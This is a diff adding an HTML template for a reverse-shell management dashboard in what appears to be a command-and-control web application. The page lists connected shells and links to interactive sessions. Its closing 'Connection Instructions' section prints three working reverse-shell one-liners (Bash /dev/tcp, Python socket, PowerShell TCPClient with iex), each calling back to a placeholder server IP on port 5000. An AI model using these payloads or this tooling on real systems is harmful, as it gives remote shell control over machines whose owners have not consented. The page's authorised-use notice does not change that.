@@ -1,0 +1,109 @@
+{% extends 'base.html' %}
+{% block title %}Reverse Shells{% endblock %}
+{% block content %}
+<section class="card">
+  <div class="card-header">
+    <h2>Reverse Shell Connections</h2>
+    <div class="toolbar">
+      <a href="{{ url_for('main.export_shell_executions') }}" class="btn ghost">Export History CSV</a>
+    </div>
+  </div>
+
+  {% if groups %}
+  <div style="margin: 1rem 0;">
+    <strong>Filter by group:</strong>
+    <a href="{{ url_for('main.shells_dashboard') }}" class="btn ghost" style="padding: 0.3rem 0.6rem;">All</a>
+    {% for g in groups %}
+    <a href="{{ url_for('main.shells_dashboard', group=g) }}" 
+       class="btn {% if g == selected_group %}{% else %}ghost{% endif %}" 
+       style="padding: 0.3rem 0.6rem;">{{ g }}</a>
+    {% endfor %}
+  </div>
+  {% endif %}
+
+  <table>
+    <thead>
+      <tr>
+        <th>Status</th>
+        <th>Name</th>
+        <th>Address</th>
+        <th>Group</th>
+        <th>Platform</th>
+        <th>Hostname</th>
+        <th>Last Seen</th>
+        <th>Actions</th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for shell in shells %}
+      <tr>
+        <td>
+          {% if shell.id in active_shell_ids %}
+          <span class="pill success">● Connected</span>
+          {% else %}
+          <span class="pill failed">○ Disconnected</span>
+          {% endif %}
+        </td>
+        <td><strong>{{ shell.name }}</strong></td>
+        <td><code>{{ shell.address }}:{{ shell.port }}</code></td>
+        <td>{{ shell.group_name }}</td>
+        <td>{{ shell.platform or 'Unknown' }}</td>
+        <td>{{ shell.hostname or '-' }}</td>
+        <td>
+          {% if shell.last_seen %}
+          {{ shell.last_seen.strftime('%Y-%m-%d %H:%M:%S') }}
+          {% else %}
+          Never
+          {% endif %}
+        </td>
+        <td>
+          <a href="{{ url_for('main.shell_detail', shell_id=shell.id) }}" class="btn ghost" style="padding: 0.3rem 0.6rem;">
+            {% if shell.id in active_shell_ids %}Interact{% else %}View{% endif %}
+          </a>
+          {% if current_user.role == 'admin' %}
+          <a href="{{ url_for('main.edit_shell', shell_id=shell.id) }}" class="btn ghost" style="padding: 0.3rem 0.6rem;">Edit</a>
+          {% endif %}
+        </td>
+      </tr>
+      {% else %}
+      <tr><td colspan="8">No reverse shells registered yet. Configure your agents to connect to port 5000.</td></tr>
+      {% endfor %}
+    </tbody>
+  </table>
+
+  <div class="pagination-row">
+    {% if shells_pagination.has_prev %}
+    <a class="btn ghost" href="{{ url_for('main.shells_dashboard', page=shells_pagination.prev_num, group=selected_group) }}">Prev</a>
+    {% endif %}
+    <span>Page {{ shells_pagination.page }} / {{ shells_pagination.pages or 1 }}</span>
+    {% if shells_pagination.has_next %}
+    <a class="btn ghost" href="{{ url_for('main.shells_dashboard', page=shells_pagination.next_num, group=selected_group) }}">Next</a>
+    {% endif %}
+  </div>
+</section>
+
+<section class="card" style="margin-top: 1rem;">
+  <h3>Connection Instructions</h3>
+  <p>To connect a reverse shell to this server, use one of the following methods:</p>
+  
+  <div style="margin-top: 1rem;">
+    <strong>Linux/macOS (Bash):</strong>
+    <pre>bash -i >& /dev/tcp/YOUR_SERVER_IP/5000 0>&1</pre>
+  </div>
+  
+  <div style="margin-top: 1rem;">
+    <strong>Python:</strong>
+    <pre>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_SERVER_IP",5000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</pre>
+  </div>
+  
+  <div style="margin-top: 1rem;">
+    <strong>PowerShell (Windows):</strong>
+    <pre>$client = New-Object System.Net.Sockets.TCPClient("YOUR_SERVER_IP",5000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</pre>
+  </div>
+  
+  <p style="margin-top: 1rem; color: #d9534f;">
+    <strong>⚠ Security Notice:</strong> These reverse shells should only be used on systems you own or have explicit permission to access. 
+    Unauthorized access to computer systems is illegal.
+  </p>
+</section>
+{% endblock %}
